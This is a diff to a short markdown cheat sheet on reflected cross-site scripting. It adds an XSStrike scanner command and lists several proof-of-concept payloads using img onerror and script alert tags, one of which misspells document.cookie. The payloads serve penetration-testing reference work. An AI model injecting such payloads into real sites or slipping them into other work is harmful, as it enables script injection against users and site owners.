@@ -1,5 +1,11 @@
 # XSS
 ## Reflected XSS :
+
+### Automation :
+- XSStrike `python3 xsstrike.py -u "Link"`
+- 
+
+### Manual :
 - Universal : `"><img src=x onerror=alert('XSS')>`
 - Simple Alert Box : `<script>alert(document.cookies)</script>`
 - Using HTML Tags : `<img src="x" onerror="alert('XSS')">`
